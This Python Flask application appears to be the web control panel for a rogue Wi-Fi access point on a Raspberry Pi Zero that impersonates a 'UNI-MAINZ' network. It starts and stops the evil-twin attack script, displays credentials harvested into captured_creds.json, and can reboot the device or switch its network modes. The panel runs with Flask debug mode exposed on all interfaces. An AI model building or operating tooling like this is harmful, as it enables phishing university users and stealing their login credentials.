from flask import Flask, render_template, request, redirect, url_for, jsonify
import subprocess
import os
import json
import time

# Configuration
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
CREDS_FILE = os.path.join(SCRIPT_DIR, 'captured_creds.json')
PORT = 5000

app = Flask(__name__, template_folder=SCRIPT_DIR)

def run_command(command):
    """Run a shell command and return output"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

def get_status():
    """Determine current mode (AP, Client, Attack)"""
    # Check if hostapd is running (specific to attack mode)
    hostapd_running = subprocess.run("pgrep hostapd", shell=True).returncode == 0
    
    # Check active NetworkManager connection
    nm_status = subprocess.run("nmcli -t -f NAME connection show --active", shell=True, capture_output=True, text=True).stdout
    
    # Check which SSID is being broadcast (if any)
    broadcast_ssid = subprocess.run("iw dev wlan0 info 2>/dev/null | grep ssid", shell=True, capture_output=True, text=True).stdout
    
    if hostapd_running or "UNI-MAINZ" in broadcast_ssid:
        return "ATTACK_MODE"
    elif "PI-ZERO" in nm_status or "PI-ZERO" in broadcast_ssid:
        return "MANAGEMENT_MODE"
    elif nm_status.strip():
        return "CLIENT_MODE"
    else:
        return "UNKNOWN"

@app.route('/')
def index():
    status = get_status()
    
    # Load credentials
    creds = []
    if os.path.exists(CREDS_FILE):
        try:
            with open(CREDS_FILE, 'r') as f:
                creds = json.load(f)
                # Sort by timestamp desc
                creds.reverse()
        except:
            pass
            
    return render_template('control.html', status=status, creds=creds)

@app.route('/action', methods=['POST'])
def action():
    act = request.form.get('action')
    
    if act == 'start_attack':
        # We need to run this in background properly
        # The script kills network, so we might lose connection temporarily
        subprocess.Popen(['sudo', os.path.join(SCRIPT_DIR, '4_run_rogue_ap.sh')])
        time.sleep(5) # Wait for network to switch
        
    elif act == 'stop_attack':
        # Kill the rogue AP process
        subprocess.run("sudo pkill -f 'python3 app.py'", shell=True)
        # Run switch mode to restore PI-ZERO
        subprocess.Popen(['sudo', os.path.join(SCRIPT_DIR, 'switch_mode.sh'), 'ap'])
        time.sleep(10)
        
    elif act == 'management_mode':
        subprocess.Popen(['sudo', os.path.join(SCRIPT_DIR, 'switch_mode.sh'), 'ap'])
        time.sleep(5)
        
    elif act == 'client_mode':
        subprocess.Popen(['sudo', os.path.join(SCRIPT_DIR, 'switch_mode.sh'), 'client'])
        
    elif act == 'reboot':
        subprocess.Popen(['sudo', 'reboot'])
        
    elif act == 'shutdown':
        subprocess.Popen(['sudo', 'shutdown', 'now'])
        
    elif act == 'clear_creds':
        if os.path.exists(CREDS_FILE):
            os.remove(CREDS_FILE)
            
    return redirect(url_for('index'))

if __name__ == '__main__':
    # Listen on all interfaces
    app.run(host='0.0.0.0', port=PORT, debug=True)
